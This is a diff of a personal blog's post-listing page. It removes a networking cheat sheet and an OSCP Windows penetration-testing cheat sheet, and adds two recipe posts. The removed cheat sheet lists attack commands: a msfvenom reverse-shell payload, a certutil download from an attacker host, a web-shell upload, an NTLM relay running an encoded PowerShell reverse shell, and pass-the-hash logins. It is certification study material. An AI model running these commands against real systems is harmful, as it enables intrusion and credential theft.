@@ -179,126 +179,6 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---networking/">Cheat Sheet - Networking</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/tag1/">tag1</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<p><strong>Network security</strong> is the practices and policies used to protect and monitor a computer network’s resources against threats and risks.</p>
-<p><strong>Client-server model</strong> is a network computing model that defines how resources and services are shared across a network. Uses a <strong><!-- raw HTML omitted -->“request and response”<!-- raw HTML omitted --></strong> method of device communication.</p>
-<p><strong>Network threats and risks</strong></p>
-<ul>
-<li>Unauthorized access into networks</li>
-<li>Denial of service (DoS) attacks</li>
-<li>Eavesdropping</li>
-<li>Data modification (eg attacker steals your data &amp; modifies without your knowledge)</li>
-</ul>
-<p><strong>Local Area Network (LAN)</strong> is a private computer network that connects devices in smaller physical areas like a room or single building, such as a small office or home network.</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---networking/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---windows/">Cheat Sheet - OSCP Windows</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>Related:
-Tags: <a href="/posts/oscp/">OSCP</a></p>
-<hr>
-<h2 id="quick-reference">Quick Reference</h2>
-<ul>
-<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
-<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
-<li><code>dir /s/b *.txt</code></li>
-<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
-<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
-<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
-<li>Compile C#: <code>msbuild projectname.csproj</code></li>
-<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
-<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
-<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
-</ul>
-<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h2>
-<ul>
-<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
-<ul>
-<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
-</ul>
-</li>
-<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
-<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
-<ul>
-<li><code>smbclient -U user \\\\192.168.</code></li>
-<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
-<ul>
-<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
-</ul>
-</li>
-<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
-</ul>
-</li>
-<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
-<ul>
-<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
-<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
-<ul>
-<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="impacket">Impacket</h2>
-<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
-<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
           <a href="/posts/cheat-sheet---linux/">Cheatsheet - Linux</a>
         </h2>
         <div class="post-meta"></div>
@@ -603,6 +483,168 @@ Tags: <a href="/posts/oscp/">OSCP</a></p>
         
            <div>
             <a class="read-more button inline" href="/posts/meal---cheese-pull-apart-bread/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/meal---cheeseburger-bowls/">Cheeseburger Bowls</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/meal/">meal</a>&nbsp;
+            
+            #<a href="/tags/beef/">beef</a>&nbsp;
+            
+            #<a href="/tags/bowl/">bowl</a>&nbsp;
+            
+            #<a href="/tags/burger/">burger</a>&nbsp;
+            
+            #<a href="/tags/high-protein/">high-protein</a>&nbsp;
+            
+            #<a href="/tags/meal-prep/">meal-prep</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <hr>
+<h1 id="ingredients">Ingredients</h1>
+<ul>
+<li>Ground beef - 500g</li>
+<li>Potatoes (or fries) - 400g</li>
+<li>Cheese - 1 cup (shredded)</li>
+<li>Pickles - to taste</li>
+<li>Lettuce - 1–2 cups (shredded)</li>
+<li>Onion - 1/2 (diced)</li>
+</ul>
+<h2 id="burger-sauce">Burger Sauce</h2>
+<ul>
+<li>Mayonnaise - 3 tbsp</li>
+<li>Ketchup - 1 tbsp</li>
+<li>Mustard - 1 tsp</li>
+<li>Pickle juice - 1 tsp</li>
+</ul>
+<h1 id="directions">Directions</h1>
+<ol>
+<li>Cook potatoes or fries until crispy</li>
+<li>Cook ground beef with salt and pepper until browned</li>
+<li>Mix burger sauce ingredients in a bowl</li>
+<li>Assemble bowls with potatoes, beef, cheese, lettuce, onion, and pickles</li>
+<li>Drizzle with burger sauce and serve</li>
+</ol>
+<h1 id="macros">Macros</h1>
+<ul>
+<li>Calories - 520</li>
+<li>Protein - 40g</li>
+<li>Carbs - 35g</li>
+<li>Fat - 22g</li>
+</ul>
+<h1 id="notes">Notes</h1>
+<ul>
+<li>Identified as cheeseburger-style bowl based on user verification</li>
+<li>Typical “burger in a bowl” structure (beef + potato base + sauce)</li>
+</ul>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/meal---cheeseburger-bowls/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/meal---chicken--chorizo-one-pan-rice/">Chicken &amp; Chorizo One Pan Rice</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/meal/">meal</a>&nbsp;
+            
+            #<a href="/tags/chicken/">chicken</a>&nbsp;
+            
+            #<a href="/tags/chorizo/">chorizo</a>&nbsp;
+            
+            #<a href="/tags/rice/">rice</a>&nbsp;
+            
+            #<a href="/tags/one-pan/">one-pan</a>&nbsp;
+            
+            #<a href="/tags/high-protein/">high-protein</a>&nbsp;
+            
+            #<a href="/tags/meal-prep/">meal-prep</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <hr>
+<h1 id="ingredients">Ingredients</h1>
+<ul>
+<li>Chicken breast - 600g (diced)</li>
+<li>Chorizo - 120–150g (sliced)</li>
+<li>Rice - 250–300g (uncooked, rinsed)</li>
+<li>Onion - 1 (diced)</li>
+<li>Red and yellow peppers - 2 (chopped)</li>
+<li>Garlic - 3 cloves (minced)</li>
+<li>Chicken stock - 500–700ml</li>
+<li>Tomato paste - 2 tbsp</li>
+<li>Oil - 1 tbsp</li>
+</ul>
+<h1 id="seasoning">Seasoning</h1>
+<ul>
+<li>Smoked paprika - 2 tsp</li>
+<li>Garlic powder - 1 tsp</li>
+<li>Salt</li>
+<li>Pepper</li>
+<li>Chilli (optional)</li>
+</ul>
+<h1 id="directions">Directions</h1>
+<ol>
+<li>Heat oil in a large pan and cook chorizo until it releases oils</li>
+<li>Add onion, peppers, and garlic, cooking until softened</li>
+<li>Add chicken and cook until browned</li>
+<li>Stir in tomato paste and seasoning</li>
+<li>Add rice and mix to coat in flavours</li>
+<li>Pour in chicken stock and bring to a simmer</li>
+<li>Cover and cook for 15–20 minutes until rice is tender and liquid absorbed</li>
+<li>Fluff and serve</li>
+</ol>
+<h1 id="macros">Macros</h1>
+<ul>
+<li>Calories - 600</li>
+<li>Protein - 45g</li>
+<li>Carbs - 60g</li>
+<li>Fat - 18g</li>
+</ul>
+<h1 id="notes">Notes</h1>
+<ul>
+<li>Confirmed from indexed reel + multiple matching recipes :contentReference[oaicite:4]{index=4}</li>
+<li>Similar to simplified paella-style cooking (one-pan absorption method)</li>
+<li>Very strong meal prep option</li>
+</ul>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/meal---chicken--chorizo-one-pan-rice/">[Read more]</a>
           </div>
         
       </article>
